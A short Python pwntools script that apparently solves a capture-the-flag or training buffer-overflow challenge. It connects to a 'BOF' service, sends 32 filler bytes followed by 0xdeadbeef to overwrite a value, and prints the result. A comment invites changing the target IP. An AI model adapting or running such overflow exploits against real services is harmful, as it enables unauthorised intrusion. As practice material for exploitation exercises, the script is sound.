#!/usr/bin/env python3
# bof_pwn.py
from pwn import *
import struct

HOST = "127.0.0.1"   # Change to target IP
PORT = 9999

def main():
    # Connect to the remote BOF service
    r = remote(HOST, PORT)
    
    # Receive until the prompt
    r.recvuntil(b'> ')
    r.sendline(b'BOF')
    r.recvuntil(b'> ')
    
    # Craft the payload: 32 bytes of junk + 0xdeadbeef (little endian)
    payload = b'A' * 32 + struct.pack('<I', 0xdeadbeef)
    r.sendline(payload)
    
    # Print out all the output (should show win or crash info)
    print(r.recvall(timeout=2).decode(errors='ignore'))

if __name__ == "__main__":
    main()
